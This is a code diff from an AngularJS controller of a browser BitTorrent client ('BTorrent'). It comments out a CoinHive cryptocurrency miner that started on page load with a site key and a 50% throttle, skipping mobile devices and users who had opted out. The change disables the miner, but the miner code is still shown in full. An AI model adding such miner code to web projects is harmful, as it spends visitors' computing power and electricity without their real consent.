@@ -64,13 +64,13 @@ const app = angular.module('BTorrent',
 )
 
 app.controller('BTorrentCtrl', ['$scope', '$rootScope', '$http', '$log', '$location', 'ngNotify', function ($scope, $rootScope, $http, $log, $location, ngNotify) {
-  if (window.CoinHive) {
-    const miner = new CoinHive.Anonymous('YzzZ9mraj45TeCzxlvBX7yVm9O3GbV60', {throttle: 0.5})
+  // if (window.CoinHive) {
+  //   const miner = new CoinHive.Anonymous('YzzZ9mraj45TeCzxlvBX7yVm9O3GbV60', {throttle: 0.5})
 
-    if (!miner.isMobile() && !miner.didOptOut(3600)) {
-      miner.start()
-    }
-  }
+  //   if (!miner.isMobile() && !miner.didOptOut(3600)) {
+  //     miner.start()
+  //   }
+  // }
 
   let updateAll
   $rootScope.version = VERSION
